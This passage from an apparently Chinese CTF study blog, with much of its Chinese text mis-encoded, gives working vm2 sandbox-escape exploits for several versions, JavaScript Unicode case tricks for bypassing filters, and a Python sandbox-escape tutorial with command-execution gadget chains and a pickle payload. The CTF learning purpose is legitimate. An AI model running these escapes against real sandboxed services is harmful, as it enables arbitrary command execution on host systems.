<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">Object.prototype.has=(t,k)=&gt;&#123;</span></span><br><span class="line"><span class="string">	process = t.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"" in Buffer.from;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.6.5</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Object.defineProperty(Buffer.from(""), "", &#123;get set()&#123;</span></span><br><span class="line"><span class="string">		Object.defineProperty(Object.prototype,"get",&#123;get()&#123;</span></span><br><span class="line"><span class="string">			throw x=&gt;x.constructor("return process")();</span></span><br><span class="line"><span class="string">		&#125;&#125;);</span></span><br><span class="line"><span class="string">		return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">	&#125;&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt; =3.6.4</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Buffer.from(&#123;</span></span><br><span class="line"><span class="string">		valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">			throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">				getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">					throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;)</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vm2&lt;=3.5.2</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Buffer.from(&#123;</span></span><br><span class="line"><span class="string">		valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">			throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">				getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">					throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;)</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="javascriptå¤§å°å†™ç‰¹æ€§"><a href="#javascriptå¤§å°å†™ç‰¹æ€§" class="headerlink" title="javascriptå¤§å°å†™ç‰¹æ€§"></a>javascriptå¤§å°å†™ç‰¹æ€§</h2><p>å¯¹äºtoUpperCase():</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">å­—ç¬¦<span class="string">"Ä±"</span>ã€<span class="string">"Å¿"</span> ç»è¿‡<span class="keyword">to</span>UpperCaseå¤„ç†åç»“æœä¸º <span class="string">"I"</span>ã€<span class="string">"S"</span></span><br></pre></td></tr></table></figure>

<p>å¯¹äºtoLowerCase():</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">å­—ç¬¦<span class="string">"â„ª"</span>ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º<span class="string">"k"</span><span class="comment">(è¿™ä¸ªâ„ªä¸æ˜¯K)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ç»•ä¸€äº›è§„åˆ™çš„æ—¶å€™å°±å¯ä»¥åˆ©ç”¨è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œç»•è¿‡</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>python_webå­¦ä¹ </title>
    <url>/2020/06/python-web%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-æ²™ç®±é€ƒé€¸"><a href="#1-æ²™ç®±é€ƒé€¸" class="headerlink" title="1.æ²™ç®±é€ƒé€¸"></a>1.æ²™ç®±é€ƒé€¸</h2><p>Python çš„æ²™ç®±é€ƒé€¸çš„æœ€ç»ˆç›®æ ‡å°±æ˜¯æ‰§è¡Œç³»ç»Ÿä»»æ„å‘½ä»¤ï¼Œæ¬¡ä¸€ç‚¹çš„å†™æ–‡ä»¶ï¼Œå†æ¬¡ä¸€ç‚¹çš„è¯»æ–‡ä»¶ã€‚æµ‹è¯•ç¯å¢ƒæ˜¯ <code>python3.8.2</code>,<code>py3.x</code>å„ä¸ªç‰ˆæœ¬é—´æœ‰ä¸€äº›å·®å¼‚ï¼Œä½†æ€»ä½“çš„æ–¹æ³•ä¸å˜ã€‚py2å°±ä¸è®¨è®ºäº†</p><ul>
<li><h4 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a><strong>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</strong></h4>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">os.popen(<span class="string">"whoami"</span>).read()</span><br><span class="line">subprocess.run(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>) //å¦‚æœ shell è®¾ä¸º <span class="literal">True</span>,å‘½ä»¤æ˜¯è¢«Bash(Sh)å¯åŠ¨ï¼Œæ‰€ä»¥æ”¯æŒshellè¯­æ³•ã€‚ å¦‚æœshell=<span class="literal">False</span>çš„è¯ï¼Œå¯åŠ¨çš„æ˜¯å¯æ‰§è¡Œç¨‹åºæœ¬èº«ï¼Œåé¢çš„å‚æ•°ä¸å†æ”¯æŒshellè¯­æ³•ã€‚</span><br><span class="line">subprocess.Popen(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">"whoami"</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure>

<p>  æ‰§è¡Œç³»ç»Ÿå‘½ä»¤åªæœ‰ <code>os</code> <code>subprocess</code></p>
</li>
<li><h4 id="æ‰§è¡ŒPythonä»£ç "><a href="#æ‰§è¡ŒPythonä»£ç " class="headerlink" title="æ‰§è¡ŒPythonä»£ç "></a><strong>æ‰§è¡ŒPythonä»£ç </strong></h4>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eval(expression[, globals[, locals]]) //å®å‚æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»¥åŠå¯é€‰çš„ globals å’Œ localsã€‚globals å®å‚å¿…é¡»æ˜¯ä¸€ä¸ªå­—å…¸ã€‚locals å¯ä»¥æ˜¯ä»»ä½•æ˜ å°„å¯¹è±¡ã€‚</span><br><span class="line">exec(object[, globals[, locals]])  //è¿™ä¸ªå‡½æ•°æ”¯æŒåŠ¨æ€æ‰§è¡Œ Python ä»£ç ã€‚object å¿…é¡»æ˜¯å­—ç¬¦ä¸²æˆ–è€…ä»£ç å¯¹è±¡ã€‚<span class="keyword">exec</span>å‡½æ•°çš„è¿”å›å€¼æ°¸è¿œä¸º<span class="literal">None</span>ã€‚</span><br><span class="line">f-string</span><br></pre></td></tr></table></figure>

  <figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">exec('import os <span class="comment">;os.system("whoami")')</span></span><br><span class="line">eval('__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)')</span><br><span class="line">f'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;' //F'&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"whoami"</span>)&#125;'</span><br></pre></td></tr></table></figure>

<p>  è¿™ä¸¤ä¸ªå‡½æ•°æ˜¯å†…ç½®å‡½æ•°ã€‚</p>
<p>  å¤§ä½“ä¸Šå°±æ˜¯ <code>æ‰§è¡Œpythonä»£ç  -&gt; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</code></p>
</li>
<li><h4 id="å…³é”®æ–¹æ³•"><a href="#å…³é”®æ–¹æ³•" class="headerlink" title="å…³é”®æ–¹æ³•"></a><strong>å…³é”®æ–¹æ³•</strong></h4></li>
</ul><a id="more"></a>

<p><code>__init__</code> ç±»çš„å®ä¾‹åŒ–</p>
<p><code>__base__</code> åˆ—å‡ºå…¶åŸºç±»ã€‚<code>__base__</code> å’Œ <code>__bases__</code>éƒ½æ˜¯è¿”å›å½“å‰ç±»çš„åŸºç±»ï¼Œåªä¸è¿‡<code>__bases__</code>è¿”å›çš„æ˜¯ä¸€ä¸ªå…ƒç¥–</p>
<p><code>__mro__</code> é€’å½’æ˜¾ç¤ºå…¶çˆ¶ç±»ç›´åˆ°object</p>
<p><code>__subclasses__()[]</code> è·å–å­ç±»</p>
<p><code>__class__</code> è·å¾—å½“å‰å¯¹è±¡çš„ç±»</p>
<p><code>object.__getattribute__(self, name)</code> æ­¤æ–¹æ³•ä¼šæ— æ¡ä»¶åœ°è¢«è°ƒç”¨ä»¥å®ç°å¯¹ç±»å®ä¾‹å±æ€§çš„è®¿é—®ã€‚</p>
<p><code>__globals__</code>   <code>function.__globals__</code> ç­‰åŒäºglobals()ã€‚dir() çš„ç»“æœæ˜¯ä¸Šé¢ä¸¤ä¸ªçš„é”®å€¼</p>
<p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[138].__init__.__getattribute__(&quot;__globals__&quot;)</code>  //<code>os._wrap_close</code>ç±»</p>
<p><code>__dir__</code> ä¸€ä¸ªå­—å…¸æˆ–å…¶ä»–ç±»å‹çš„æ˜ å°„å¯¹è±¡ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡çš„ï¼ˆå¯å†™ï¼‰å±æ€§ã€‚</p>
<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__dict__[&apos;upper&apos;]
&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;
&gt;&gt;&gt; &apos;&apos;.__class__.upper
&lt;method &apos;upper&apos; of &apos;str&apos; objects&gt;</code></pre><p><code>__import__</code> <code>import</code>ä¸€ä¸ªæ¨¡å—</p>
<p><code>bulitins</code>  Python3çš„å†…å»ºæ¨¡å—ï¼Œè¯¥å†…å»ºæ¨¡å—ä¸­çš„åŠŸèƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¸ç”¨åœ¨å…¶å‰æ·»åŠ å†…å»ºæ¨¡å—å‰ç¼€</p>
<pre><code>import builtins
dir(builtins) //æ‰“å°æ‰€æœ‰çš„å†…è”å‡½æ•°å¯è·å–eval exec</code></pre><p><code>__builtins__</code> <code>builtins</code> çš„å¼•ç”¨ <code>__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</code></p>
<p><code>__name__</code> ä¸ªå€¼è·å¾—çš„åªæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸æ˜¯æ¨¡å—çš„å¼•ç”¨ï¼Œä½¿ç”¨<code>sys.modules[__name__]</code> æ‰è·å¾—çš„æ˜¯æ¨¡å—çš„å¼•ç”¨<br>        <code>__call__(self[, args...])</code> æ­¤æ–¹æ³•ä¼šåœ¨å®ä¾‹ä½œä¸ºä¸€ä¸ªå‡½æ•°è¢«â€œè°ƒç”¨â€æ—¶è¢«è°ƒç”¨ï¼›å¦‚æœå®šä¹‰äº†æ­¤æ–¹æ³•ï¼Œåˆ™ <code>x(arg1, arg2, ...)</code> å°±ç›¸å½“äº <code>x.__call__(arg1, arg2, ...)</code></p>
<p><code>().__class__.__bases__[0].__subclasses__()[37].__call__(exec,&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)</code></p>
<p><code>dir()</code> å°†æ˜¾ç¤ºå¯¹è±¡çš„å±æ€§çš„åç§°ï¼Œ<code>__dict__</code>æ˜¯dir()çš„å­é›†ã€‚æ³¨æ„<a href="https://docs.python.org/zh-cn/3/library/functions.html#dir" target="_blank" rel="noopener"><code>dir()</code></a> ä¸ä¼šåˆ—å‡ºå†…ç½®å‡½æ•°å’Œå˜é‡çš„åç§°</p>
<p><code>getattr(object, name[, default])</code>  è¿”å›å¯¹è±¡å‘½åå±æ€§çš„å€¼ã€‚<em>name</em> å¿…é¡»æ˜¯å­—ç¬¦ä¸²ã€‚å¦‚æœè¯¥å­—ç¬¦ä¸²æ˜¯å¯¹è±¡çš„å±æ€§ä¹‹ä¸€ï¼Œåˆ™è¿”å›è¯¥å±æ€§çš„å€¼ã€‚ä¾‹å¦‚ï¼Œ <code>getattr(x, &#39;foobar&#39;)</code> ç­‰åŒäº <code>x.foobar</code> å¯ä»¥ç”¨è¿™ä¸ªç‰¹æ€§ç»•è¿‡ <code>.</code> è¢«è¿‡æ»¤çš„æƒ…å†µ</p>
<p><code>pickle</code> è¿™ä¸ªæ˜¯python çš„ä¸€ä¸ªåºåˆ—åŒ–çš„æ–¹æ³•ï¼Œç”¨äºå°†å¯¹è±¡å­˜å‚¨åœ¨å­—ç¬¦ä¸²å¯¹è±¡ä¸­ï¼Œå®ç°å¯¹è±¡çš„æŒä¹…åŒ–ã€‚</p>
<p>â€‹     <code>pickle.loads(b&quot;cos\nsystem\n(S&#39;ls&#39;\ntR.&quot;) //æ‰§è¡Œå‘½ä»¤</code></p>
<p><code>timeitæ¨¡å—</code> æµ‹è¯•ä»£ç çš„æ‰§è¡Œæ—¶é—´çš„<br>            <code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;,number=1)</code></p>
<p><code>importlibæ¨¡å—</code> </p>
<p>â€‹    <code>find_loader</code>ç”¨æ¥æŸ¥æ‰¾æ¨¡å—ï¼Œ<code>reload</code>é‡æ–°è½½å…¥æ¨¡å—<code>importlib.import_module(name, package=None)</code>å……å½“<code>importlib.__import__()</code>çš„ç®€åŒ–åŒ…è£…ã€‚</p>
<ul>
<li><h4 id="import-å¯¼å…¥æœºåˆ¶"><a href="#import-å¯¼å…¥æœºåˆ¶" class="headerlink" title="import å¯¼å…¥æœºåˆ¶"></a>import å¯¼å…¥æœºåˆ¶</h4><p>  <img src="/2020/06/python-webå­¦ä¹ /9113969-e5945487b84c3721.png" alt="9113969-e5945487b84c3721"></p>
</li>
</ul>
<p>æ‰€ä»¥è¯´å¦‚æœå¯¼å…¥çš„æ¨¡å—aä¸­æœ‰ç€å¦ä¸€ä¸ªæ¨¡å—bï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥ç”¨a.bçš„æ–¹æ³•æˆ–è€…<code>a.__dict__[b&lt;name&gt;]</code>çš„æ–¹æ³•é—´æ¥è®¿é—®æ¨¡å—bã€‚</p>
<p>é¡ºç€è¿™ä¸ªæ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥FUZZä¸€ä¸‹å“ªäº›æ¨¡å— <code>import</code> <code>os</code>å’Œ<code>subprocess</code>ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥è¯¢æ‰‹å†Œåˆæˆçš„æ ‡å‡†åº“å­—å…¸</span></span><br><span class="line"><span class="comment">#ç¬¬ä¸‰æ–¹åº“ä¹Ÿæ˜¯åŒæ ·fuzzçš„</span></span><br><span class="line">all_modules3=[<span class="string">'string'</span>, <span class="string">'re'</span>, <span class="string">'difflib'</span>, <span class="string">'textwrap'</span>, <span class="string">'unicodedata'</span>, <span class="string">'stringprep'</span>, <span class="string">'readline'</span>, <span class="string">'rlcompleter'</span>, <span class="string">'struct'</span>, <span class="string">'codecs'</span>, <span class="string">'datetime'</span>, <span class="string">'calendar'</span>, <span class="string">'collections'</span>, <span class="string">'heapq'</span>, <span class="string">'bisect'</span>, <span class="string">'array'</span>, <span class="string">'weakref'</span>, <span class="string">'types'</span>, <span class="string">'copy'</span>, <span class="string">'pprint'</span>, <span class="string">'reprlib'</span>, <span class="string">'enum'</span>, <span class="string">'numbers'</span>, <span class="string">'math'</span>, <span class="string">'cmath'</span>, <span class="string">'decimal'</span>, <span class="string">'fractions'</span>, <span class="string">'random'</span>, <span class="string">'statistics'</span>, <span class="string">'itertools'</span>, <span class="string">'functools'</span>, <span class="string">'operator'</span>, <span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'stat'</span>, <span class="string">'filecmp'</span>, <span class="string">'tempfile'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'pickle'</span>, <span class="string">'copyreg'</span>, <span class="string">'shelve'</span>, <span class="string">'marshal'</span>, <span class="string">'dbm'</span>, <span class="string">'sqlite3'</span>, <span class="string">'zlib'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'csv'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'xdrlib'</span>, <span class="string">'plistlib'</span>, <span class="string">'hashlib'</span>, <span class="string">'hmac'</span>, <span class="string">'secrets'</span>, <span class="string">'os'</span>, <span class="string">'io'</span>, <span class="string">'time'</span>, <span class="string">'argparse'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'errno'</span>, <span class="string">'ctypes'</span>, <span class="string">'threading'</span>, <span class="string">'multiprocessing'</span>, <span class="string">'concurrent'</span>, <span class="string">'subprocess'</span>, <span class="string">'sched'</span>, <span class="string">'queue'</span>, <span class="string">'_thread'</span>, <span class="string">'_dummy_thread'</span>, <span class="string">'dummy_threading'</span>, <span class="string">'contextvars'</span>, <span class="string">'asyncio'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'select'</span>, <span class="string">'selectors'</span>, <span class="string">'asyncore'</span>, <span class="string">'asynchat'</span>, <span class="string">'signal'</span>, <span class="string">'mmap'</span>, <span class="string">'email'</span>, <span class="string">'json'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'base64'</span>, <span class="string">'binhex'</span>, <span class="string">'binascii'</span>, <span class="string">'quopri'</span>, <span class="string">'uu'</span>, <span class="string">'xml'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'wsgiref'</span>, <span class="string">'urllib'</span>, <span class="string">'http'</span>, <span class="string">'ftplib'</span>, <span class="string">'poplib'</span>, <span class="string">'imaplib'</span>, <span class="string">'nntplib'</span>, <span class="string">'smtplib'</span>, <span class="string">'smtpd'</span>, <span class="string">'telnetlib'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'xmlrpc'</span>, <span class="string">'ipaddress'</span>, <span class="string">'audioop'</span>, <span class="string">'aifc'</span>, <span class="string">'sunau'</span>, <span class="string">'wave'</span>, <span class="string">'chunk'</span>, <span class="string">'colorsys'</span>, <span class="string">'imghdr'</span>, <span class="string">'sndhdr'</span>, <span class="string">'ossaudiodev'</span>, <span class="string">'gettext'</span>, <span class="string">'locale'</span>, <span class="string">'turtle'</span>, <span class="string">'cmd'</span>, <span class="string">'shlex'</span>, <span class="string">'tkinter'</span>, <span class="string">'typing'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'unittest'</span>, <span class="string">'2to3'</span>, <span class="string">'test'</span>, <span class="string">'bdb'</span>, <span class="string">'faulthandler'</span>, <span class="string">'pdb'</span>, <span class="string">'timeit'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'distutils'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sys'</span>, <span class="string">'sysconfig'</span>, <span class="string">'builtins'</span>, <span class="string">'__main__'</span>, <span class="string">'warnings'</span>, <span class="string">'dataclasses'</span>, <span class="string">'contextlib'</span>, <span class="string">'abc'</span>, <span class="string">'atexit'</span>, <span class="string">'traceback'</span>, <span class="string">'__future__'</span>, <span class="string">'gc'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'code'</span>, <span class="string">'codeop'</span>, <span class="string">'zipimport'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'runpy'</span>, <span class="string">'importlib'</span>, <span class="string">'parser'</span>, <span class="string">'ast'</span>, <span class="string">'symtable'</span>, <span class="string">'symbol'</span>, <span class="string">'token'</span>, <span class="string">'keyword'</span>, <span class="string">'tokenize'</span>, <span class="string">'tabnanny'</span>, <span class="string">'pyclbr'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'dis'</span>, <span class="string">'pickletools'</span>, <span class="string">'formatter'</span>, <span class="string">'msilib'</span>, <span class="string">'msvcrt'</span>, <span class="string">'winreg'</span>, <span class="string">'winsound'</span>, <span class="string">'posix'</span>, <span class="string">'pwd'</span>, <span class="string">'spwd'</span>, <span class="string">'grp'</span>, <span class="string">'crypt'</span>, <span class="string">'termios'</span>, <span class="string">'tty'</span>, <span class="string">'pty'</span>, <span class="string">'fcntl'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'_frozen_importlib'</span>, <span class="string">'_imp'</span>, <span class="string">'_warnings'</span>, <span class="string">'_frozen_importlib_external'</span>, <span class="string">'_io'</span>, <span class="string">'nt'</span>, <span class="string">'_weakref'</span>, <span class="string">'_codecs'</span>, <span class="string">'encodings.aliases'</span>, <span class="string">'encodings'</span>, <span class="string">'encodings.utf_8'</span>, <span class="string">'_signal'</span>, <span class="string">'encodings.latin_1'</span>, <span class="string">'_abc'</span>, <span class="string">'_stat'</span>, <span class="string">'_collections_abc'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>, <span class="string">'os.path'</span>, <span class="string">'_site'</span>]</span><br><span class="line"></span><br><span class="line">methods = [<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line">res = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    res[met] = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> module <span class="keyword">in</span> all_modules3:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m = __import__(module)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        attrs = dir(m)</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> attrs:</span><br><span class="line">            res[met].append(module)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    print(met+<span class="string">":"</span>+str(res[met]))</span><br></pre></td></tr></table></figure>

<p>ç»“æœï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">os</span>:<span class="selector-attr">[<span class="string">'pathlib'</span>, <span class="string">'fileinput'</span>, <span class="string">'filecmp'</span>, <span class="string">'glob'</span>, <span class="string">'fnmatch'</span>, <span class="string">'linecache'</span>, <span class="string">'shutil'</span>, <span class="string">'dbm'</span>, <span class="string">'gzip'</span>, <span class="string">'bz2'</span>, <span class="string">'lzma'</span>, <span class="string">'zipfile'</span>, <span class="string">'tarfile'</span>, <span class="string">'configparser'</span>, <span class="string">'netrc'</span>, <span class="string">'plistlib'</span>, <span class="string">'secrets'</span>, <span class="string">'getopt'</span>, <span class="string">'logging'</span>, <span class="string">'getpass'</span>, <span class="string">'curses'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'socket'</span>, <span class="string">'ssl'</span>, <span class="string">'asyncore'</span>, <span class="string">'mailcap'</span>, <span class="string">'mailbox'</span>, <span class="string">'mimetypes'</span>, <span class="string">'binhex'</span>, <span class="string">'uu'</span>, <span class="string">'webbrowser'</span>, <span class="string">'cgi'</span>, <span class="string">'cgitb'</span>, <span class="string">'smtpd'</span>, <span class="string">'uuid'</span>, <span class="string">'socketserver'</span>, <span class="string">'gettext'</span>, <span class="string">'shlex'</span>, <span class="string">'pydoc'</span>, <span class="string">'doctest'</span>, <span class="string">'bdb'</span>, <span class="string">'pdb'</span>, <span class="string">'trace'</span>, <span class="string">'tracemalloc'</span>, <span class="string">'ensurepip'</span>, <span class="string">'venv'</span>, <span class="string">'zipapp'</span>, <span class="string">'sysconfig'</span>, <span class="string">'inspect'</span>, <span class="string">'site'</span>, <span class="string">'pkgutil'</span>, <span class="string">'modulefinder'</span>, <span class="string">'tabnanny'</span>, <span class="string">'py_compile'</span>, <span class="string">'compileall'</span>, <span class="string">'msilib'</span>, <span class="string">'pipes'</span>, <span class="string">'resource'</span>, <span class="string">'nis'</span>, <span class="string">'genericpath'</span>, <span class="string">'ntpath'</span>]</span></span><br><span class="line"><span class="selector-tag">subprocess</span>:<span class="selector-attr">[<span class="string">'asyncio'</span>, <span class="string">'webbrowser'</span>, <span class="string">'imaplib'</span>, <span class="string">'venv'</span>]</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥fuzzä¸€ä¸‹å…¶ä»–çš„æ–¹æ³•æ¯”å¦‚ <code>sys</code>ï¼ˆ<code>sys.modules[&quot;os&quot;].system(&quot;whoami&quot;)</code>ï¼‰ï¼Œä¸¾ä¸€åä¸‰å°±è¡Œ</p>
<ul>
<li><h4 id="èŠ±å¼import"><a href="#èŠ±å¼import" class="headerlink" title="èŠ±å¼import"></a>èŠ±å¼import</h4>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">'os'</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'os'</span>) //æ³¨æ„å¯¼å…¥importlib</span><br></pre></td></tr></table></figure>

<p>  å¦‚æœé€šè¿‡ <code>sys.modules[&#39;os&#39;] = None</code>,é‚£ä¹ˆå°±æ— æ³•å¯¼å…¥ <code>os</code>ä½†import çš„åŸç†ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æ‰§è¡Œä¸€éå¯¼å…¥çš„åº“ã€‚è·¯å¾„å¯ä»¥é€šè¿‡ <code>sys.path</code>æŸ¥çœ‹ï¼Œé»˜è®¤éƒ½æ˜¯åœ¨ <code>/usr/lib/python3X/</code></p>
